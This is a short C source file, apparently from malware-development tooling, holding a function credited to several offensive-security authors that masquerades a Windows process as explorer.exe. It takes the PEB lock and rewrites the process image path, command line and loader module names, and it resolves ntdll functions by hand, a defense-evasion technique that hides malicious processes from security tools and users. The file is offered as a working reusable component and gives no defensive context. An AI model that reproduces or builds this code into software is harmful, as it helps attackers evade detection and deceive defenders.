/*
Function to masquerade PEB originally by @FuzzySec / @Cneelis
Optimized and unnecessary functionality removed by smelly__vx
*/
BOOL MasqueradePebAsExplorerEx(VOID)
{
	typedef NTSTATUS(NTAPI* RTLENTERCRITICALSECTION)(PRTL_CRITICAL_SECTION CriticalSection);
	typedef NTSTATUS(NTAPI* RTLLEAVECRITICALSECTION)(PRTL_CRITICAL_SECTION CriticalSection);
	RTLENTERCRITICALSECTION RtlEnterCriticalSection = NULL;
	RTLLEAVECRITICALSECTION RtlLeaveCriticalSection = NULL;
	HMODULE hModule;
	PLDR_MODULE Module = NULL;
	WCHAR wExplorerPath[MAX_PATH * sizeof(WCHAR)] = { 0 };

	PPEB Peb = GetPeb();

	Module = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink - 16);

	hModule = RfGetModuleHandleW(L"ntdll.dll");
	if (hModule == NULL)
		return FALSE;

	RtlEnterCriticalSection = (RTLENTERCRITICALSECTION)RfGetProcAddressA((DWORD64)hModule, "RtlEnterCriticalSection");
	RtlLeaveCriticalSection = (RTLLEAVECRITICALSECTION)RfGetProcAddressA((DWORD64)hModule, "RtlLeaveCriticalSection");

	if (!RtlEnterCriticalSection || !RtlLeaveCriticalSection)
		return FALSE;

	if (!CreateWindowsObjectPathW(wExplorerPath, (PWCHAR)L"\\explorer.exe", (MAX_PATH * sizeof(WCHAR)), TRUE))
		return FALSE;

	RtlEnterCriticalSection((PRTL_CRITICAL_SECTION)Peb->FastPebLock);

	RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, wExplorerPath);
	RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, wExplorerPath);
	RtlInitUnicodeString(&Module->FullDllName, wExplorerPath);
	RtlInitUnicodeString(&Module->BaseDllName, L"Explorer.exe");

	RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)Peb->FastPebLock);

	return TRUE;
}
